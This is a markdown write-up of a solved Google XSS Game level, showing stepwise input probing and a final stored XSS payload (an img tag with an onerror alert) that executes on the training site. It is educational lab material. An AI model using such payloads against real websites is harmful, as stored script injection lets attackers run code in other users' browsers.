```markdown
# 🎮 Google XSS Game – Level 2: Stored XSS

**Level Type:** Stored XSS – Inside `<blockquote>` HTML tag  
**Difficulty:** Beginner

---

## 🔗 Level URL  
[https://xss-game.appspot.com/level2/frame](https://xss-game.appspot.com/level2/frame)

---

## 🧪 Steps (My Approach)

1. ✅ Typed `flex0hi`  
   - Reflected as:  
     ```html
     <blockquote>flex0hi</blockquote>
     ```
   - ❌ No execution — just plain text.

2. ✅ Tried breaking the attribute with:  
   ```
   hi">
   ```
   - Reflected as:  
     ```html
     <blockquote>hi"></blockquote>
     ```
   - ❌ Still no script executed.

3. ✅ Injected classic XSS using `<img>` tag:  
   ```html
   <img src=x onerror="alert(1)">
   ```
   - 🎉 Success! Alert triggered.
   - XSS is **stored** and runs again after refresh.

---

## ✅ Final Payload

```html
<img src=x onerror="alert(1)">
```

---

## 🛠 Tools Used  
- Browser (manual testing)  
- DevTools → “View Page Source”  
- Common XSS payloads like `<img onerror>`

---

## 🎯 Goal  
Trigger a `JavaScript alert()` using **Stored XSS** via user input rendered inside HTML.

---

## 🧠 Notes  
- Input is rendered inside a `<blockquote>` tag.  
- No escaping or sanitization is applied.  
- Script tag (`<script>`) may be filtered, but attribute-based XSS (like `onerror`) works perfectly.  
- Comment (`<!--`) not needed in this level.

---

## ✅ Status: Solved
```
